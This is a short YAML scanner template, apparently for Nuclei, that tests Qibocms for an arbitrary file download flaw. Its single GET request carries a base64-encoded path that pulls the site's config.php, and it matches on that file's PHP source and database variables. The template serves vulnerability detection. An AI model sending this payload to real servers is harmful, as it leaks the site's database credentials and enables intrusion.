id: qibocms-file-download

info:
  name: Qibocms - Arbitrary File Download
  author: theabhinavgaur
  severity: high
  description: Qibocms is vulnerable to arbitrary file download vulnerability.
  classification:
    cpe: cpe:2.3:a:qibocms:qibocms:*:*:*:*:*:*:*:*
    cwe-id: CWE-200,CWE-552
  metadata:
    verified: true
    max-request: 1
    vendor: qibocms
    product: qibocms
  tags: qibocms,lfr,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8"

    matchers-condition: and
    matchers:
      - type: word
        name: qibocms
        cpe: cpe:2.3:a:qibocms:qibocms:*:*:*:*:*:*:*:*
        part: body
        words:
          - "<?php"
          - "$webdb"
        condition: and

      - type: word
        name: qibocms-2
        cpe: cpe:2.3:a:qibocms:qibocms:*:*:*:*:*:*:*:*
        part: header
        words:
          - "filename=config"

      - type: status
        status:
          - 200
